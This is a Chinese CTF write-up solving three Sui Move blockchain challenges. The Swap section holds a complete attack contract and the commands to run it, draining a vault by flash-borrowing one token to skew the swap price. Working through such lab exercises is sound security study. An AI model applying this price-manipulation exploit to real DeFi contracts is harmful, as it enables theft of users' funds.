- [题目源码](https://github.com/movebit/ctf2024-day1)
- # Checkin
	- 配置好环境后直接调用函数
		- ```shell
		  sui client call \
		      --function get_flag \
		      --package 0x97150d448029e8f3a5297e91a7fbbc13c7462878f3bce95586d103afc00b57dd \
		      --module checkin \
		      --gas-budget 10000000 \
		      --args 'MoveBitCTF'
		  ```
- # DynamicMatrixTraversal
	- 让合约算出一个数组并从中拿出所需数字
	- 数组如下：
		- ```python
		  import numpy as np
		  
		  m, n = 10, 200
		  a = np.zeros([m, n]).astype(np.int64)
		  for i in range(m):
		      a[i, 0] = 1
		  for j in range(n):
		      a[0, j] = 1
		  
		  for i in range(1, m):
		      for j in range(1, n):
		          a[i, j] = a[i-1, j] + a[i, j-1]
		  print(a)
		  ```
	- 传入对应数组的宽和高即可拿到transaction flag
		- ```shell
		  sui client call \
		      --gas-budget 10000000 \
		      --package 0x448e1b7cb16ce0a814e04e6d2961b42adfef8cba1cdf4a943cd64d322283207d \
		      --module matrix \
		      --function execute \
		      --args '0x2f660040e3e3cb08f547b9dee1146741e8140433c03c63d37bfb163715383df8' \
		      --args 5 \
		      --args 89
		  
		  sui client call \
		      --gas-budget 10000000 \
		      --package 0x448e1b7cb16ce0a814e04e6d2961b42adfef8cba1cdf4a943cd64d322283207d \
		      --module matrix \
		      --function execute \
		      --args '0x2f660040e3e3cb08f547b9dee1146741e8140433c03c63d37bfb163715383df8' \
		      --args 169 \
		      --args 3
		  
		  
		  sui client call \
		      --gas-budget 10000000 \
		      --package 0x448e1b7cb16ce0a814e04e6d2961b42adfef8cba1cdf4a943cd64d322283207d \
		      --module matrix \
		      --function get_flag \
		      --args '0x2f660040e3e3cb08f547b9dee1146741e8140433c03c63d37bfb163715383df8'
		  ```
- # Swap
	- 分析
		- vault的功能有
			- flash: 从vault中拿走一定量的某种token，返还后才能进行下一次flash
			- swap: 用一种token交换另一种token，价格根据vault中的所有token动态计算
		- 思路
			- 可以从vault中借走多个A, 造成A稀缺，然后用A换走所有的B，最后返还A，这样就清空了vault中的B
		- 攻击过程如下：
			- ```python
			  # 初始
			  vault = (100, 100); user = (20, 20)
			  # 从valut拿走90个A
			  vault = (10, 100); user = (110, 20)
			  # 用10个A换B
			  vault = (20, 0); user = (100, 120)
			  # 把90个A还回去
			  vault = (110, 0); user = (10, 120)
			  # 借110个A
			  vault = (0, 0); user = (120, 120)
			  ```
	- 代码
		- 合约代码如下：
		  collapsed:: true
			- ```python
			  module moveattack::attack {
			      use sui::tx_context::{TxContext};
			      use sui::coin::{Self, Coin};
			      use sui::transfer;
			      use sui::balance::{Self, Balance};
			      use sui::object::{Self, UID};
			      use swap::ctfa::{CTFA};
			      use swap::ctfb::{CTFB};
			      use swap::vault;
			  
			      struct TrashBin has key, store {
			          id: UID,
			          coin_a: Balance<CTFA>,
			          coin_b: Balance<CTFB>,
			      }
			  
			      public entry fun start(thevault: &mut vault::Vault<CTFA, CTFB>, usercoina: Coin<CTFA>, ctx: &mut TxContext){
			          // step1
			          
			          let (coina_1, coinb_1, receipt) = vault::flash<CTFA, CTFB>(thevault, 90, false, ctx);
			          let balancea = coin::into_balance(coina_1);
			          let balanceb = coin::into_balance(coinb_1);
			  
			          balance::join(&mut balancea, coin::into_balance(usercoina));
			  
			          // balancea: 110, balanceb: 0
			  
			          // step2
			  
			          let coina2 = coin::from_balance(balance::split(&mut balancea, 10), ctx);
			          let coinb2 = vault::swap_a_to_b<CTFA, CTFB>(
			              thevault,
			              coina2,
			              ctx
			          );
			          // balance::join(&mut balancea, coin::into_balance(coina2));
			          balance::join(&mut balanceb, coin::into_balance(coinb2));
			  
			          // step3
			  
			          vault::repay_flash<CTFA, CTFB>(
			              thevault,
			              coin::from_balance(balance::split(&mut balancea, 90), ctx),
			              coin::from_balance(balance::split(&mut balanceb, 0), ctx),
			              receipt
			          );
			  
			          // step4
			          let (coina_4, coinb_4, receipt2) = vault::flash<CTFA, CTFB>(thevault, 110, false, ctx);
			  
			          // done
			          vault::get_flag<CTFA, CTFB>(thevault, ctx);
			  
			          // get money back
			          vault::repay_flash<CTFA, CTFB>(
			              thevault,
			              coina_4,
			              coinb_4,
			              receipt2
			          );
			  
			          let trashbin = TrashBin{
			              id: object::new(ctx),
			              coin_a: balancea,
			              coin_b: balanceb,
			          };
			          transfer::share_object(trashbin);
			      }
			  
			  }
			  ```
		- 调用过程如下：
		  collapsed:: true
			- ```shell
			  sui client publish --gas-budget 100000000 moveattack/
			  # package 0x109585d77f16e551d3c15c643ad168ecc5a6a9780c0f9323f0a1c1779bce81a7
			  # 0x2edd75f752cd0d0b30d10d75adf6204ab3e3c0a7c3826c2551b7674e4b471f75::ctfa::CTFA
			  sui client call \
			      --gas-budget 10000000 \
			      --package 0x2edd75f752cd0d0b30d10d75adf6204ab3e3c0a7c3826c2551b7674e4b471f75 \
			      --module vault \
			      --function initialize \
			      --type-args '0x2edd75f752cd0d0b30d10d75adf6204ab3e3c0a7c3826c2551b7674e4b471f75::ctfa::CTFA' \
			      --type-args '0x2edd75f752cd0d0b30d10d75adf6204ab3e3c0a7c3826c2551b7674e4b471f75::ctfb::CTFB' \
			      --args '0xb4b25bdac5b66661f81c1b13b2185f481f4a3c1cd4a3c7a4df0e1fd948fa0253' \
			      --args '0x19003d5893c3bf4c588e1999b5b0e7fb497194375a7d87891894260f995368cc'
			  
			  # 7kMrWMzjMiqDZdXQvHhJmKCSjkwL5GhqEixaEQdvMXK3
			  # coina 0x868ee2a6241017c715dafe8073c8a72aaf0ef8ebd329d05210ffb4d05e813808
			  # coinb 0xf9c4750b6e07f688529dd191bb6d823ac39fb079d05597bb5e6cf0ab556beafb
			  # vault 0xbc03d8c9d5b4d1443651e2a07dbb13b4837fa7e234a8264c2685466e0207124a
			  sui client call \
			      --gas-budget 10000000 \
			      --package 0x109585d77f16e551d3c15c643ad168ecc5a6a9780c0f9323f0a1c1779bce81a7 \
			      --module attack \
			      --function start \
			      --args '0xbc03d8c9d5b4d1443651e2a07dbb13b4837fa7e234a8264c2685466e0207124a' \
			      --args '0x868ee2a6241017c715dafe8073c8a72aaf0ef8ebd329d05210ffb4d05e813808'
			  
			  ```
-